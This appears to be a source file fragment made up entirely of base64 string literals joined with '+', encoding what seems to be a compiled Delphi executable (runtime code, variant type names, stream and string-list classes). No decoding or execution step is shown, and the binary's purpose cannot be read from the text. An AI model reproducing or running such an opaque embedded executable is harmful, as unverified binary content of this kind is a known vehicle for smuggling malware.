'Qwjojbj+/4tV+IvG6Hd8/v/p2QMAANlDCIPE9Ns8JJuNRfTozMv+/4tV9IvG6FZ8/v/puAMAAN1DCIPE9Ns8JJuNRfDoq8v+/4tV8IvG6DV8/v/plwMAAP9zDP9zCI1F7Oiq9P//i1Xsi8bo0Hr+/+l6AwAA/3MM/3MIjUXo6MX0//+LVeiLxuizev7/6V0DAABWi0MIuf///3+6AQAAAOirff7/6UUDAACNVeQPt0MI6Mr0//+LVeSLxuiAev7/' + 
'6SoDAACNVeAPvkMI6MO3/v+LVeCLxuite/7/6Q8DAACNVdwPtkMI6Ki3/v+LVdyLxuiSe/7/6fQCAACNVdgPt0MI6I23/v+LVdiLxuh3e/7/6dkCAACLQwgz0lJQjUXU6Fu4/v+LVdSLxuhZe/7/6bsCAAD/cwz/cwiNRdDoPrj+/4tV0IvG6Dx7/v/pngIAAItDCIvQi8bow/3//+mNAgAAjVXMi8Po0Pv//4tVzIvG6Mp5/v/pdAIAAIvQZoHq' + 
'AAF0B2b/ynQR6yiLxotTCOjzev7/6VUCAACNVciLw+hQ/P//i1XIi8boknn+/+k8AgAA9sRAD4QLAgAAD7fAJf+///+D+BQPh+QBAAD/JIXU1UEAsddBALHXQQAo1kEARdZBAGHWQQCE1kEAp9ZBAMbWQQDl1kEAsddBALHXQQD21kEAo9dBALHXQQCx10EAsddBABPXQQAw10EATddBAGrXQQCH10EAjVXEi0MID78A6F62/v+LVcSLxuhIev7/' + 
'6aoBAACNVcCLQwiLAOhCtv7/i1XAi8boLHr+/+mOAQAAi0MI2QCDxPTbPCSbjUW86H/J/v+LVbyLxugJev7/6WsBAACLQwjdAIPE9Ns8JJuNRbjoXMn+/4tVuIvG6OZ5/v/pSAEAAItDCP9wBP8wjUW06Fny//+LVbSLxuh/eP7/6SkBAACLQwj/cAT/MI1FsOhy8v//i1Wwi8boYHj+/+kKAQAAi8aLUwiLEug/ef7/6fkAAACNVayLQwgPtwDo' + 
'fPL//4tVrIvG6DJ4/v/p3AAAAI1VqItDCA++AOhztf7/i1Woi8boXXn+/+m/AAAAjVWki0MID7YA6Fa1/v+LVaSLxuhAef7/6aIAAACNVaCLQwgPtwDoObX+/4tVoIvG6CN5/v/phQAAAItDCIsAM9JSUI1FnOgFtv7/i1Wci8boA3n+/+toi0MI/3AE/zCNRZjo6bX+/4tVmIvG6Od4/v/rTItDCIvQi8bocfv//+s+jVWUi8Pogfn//4tVlIvG' + 
'6Ht3/v/rKIvG6DZ3/v+L0IvD6IH6//+EwHUUjVWQi8PoV/n//4tVkIvG6FF3/v8zwFpZWWSJEGhs2EEAjUWQugIAAADoE3f+/41FmLoFAAAA6N5v/v+NRay6AwAAAOj5dv7/jUW4ugQAAADoxG/+/41FyLoCAAAA6N92/v+NRdC6BQAAAOiqb/7/jUXkugMAAADoxXb+/41F8LoEAAAA6JBv/v/D6ZJn/v/rkF5bi+Vdw4vAZoM4CHIa/3AM/3AI' + 
'/3AE/zBmxwAAAIni6Dvw//+DxBDDjUAA/////wUAAABFbXB0eQAAAP////8EAAAATnVsbAAAAAD/////CAAAAFNtYWxsaW50AAAAAP////8HAAAASW50ZWdlcgD/////BgAAAFNpbmdsZQAA/////wYAAABEb3VibGUAAP////8IAAAAQ3VycmVuY3kAAAAA/////wQAAABEYXRlAAAAAP////8GAAAAT2xlU3RyAAD/////CAAAAERpc3BhdGNo' + 
'AAAAAP////8FAAAARXJyb3IAAAD/////BwAAAEJvb2xlYW4A/////wcAAABWYXJpYW50AP////8HAAAAVW5rbm93bgD/////BwAAAERlY2ltYWwA/////wMAAAAkMEYA/////wgAAABTaG9ydEludAAAAAD/////BAAAAEJ5dGUAAAAA/////wQAAABXb3JkAAAAAP////8IAAAATG9uZ1dvcmQAAAAA/////wUAAABJbnQ2NAAAAFWL7IHE+P3/' + 
'/1NWVzPJiY34/f//i/KL2DPAVWge20EAZP8wZIkgi/tmgef/D2aD/xR3FovGD7fXixSVQCRDAOjobf7/6Z4AAABmgfsAAXURi8a6NNtBAOjQbf7/6YYAAABmgfsBAXUOi8a6RNtBAOi4bf7/63GNVfyLw+jcAwAAhMB0O42F/P7//1CNlfz9//+LRfyLAOjFX/7/jYX8/f//uf///3+6AgAAAOgQVf7/jZX8/v//i8bof2/+/+sojY34/f//D7fH' + 
'ugQAAADo3rL+/4uN+P3//4sVHCdDAIsSi8bo5W/+//bHIHQOiw6LxrpQ20EA6NJv/v/2x0B0DosOi8a6YNtBAOi/b/7/M8BaWVlkiRBoJdtBAI2F+P3//+izbP7/w+nZZP7/6+1fXluL5V3D/////wYAAABTdHJpbmcAAP////8DAAAAQW55AP////8GAAAAQXJyYXkgAAD/////BgAAAEJ5UmVmIAAAU1aL8ovYi8PoL+r//2bHAwoAiXMIXlvD' + 
'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' + 
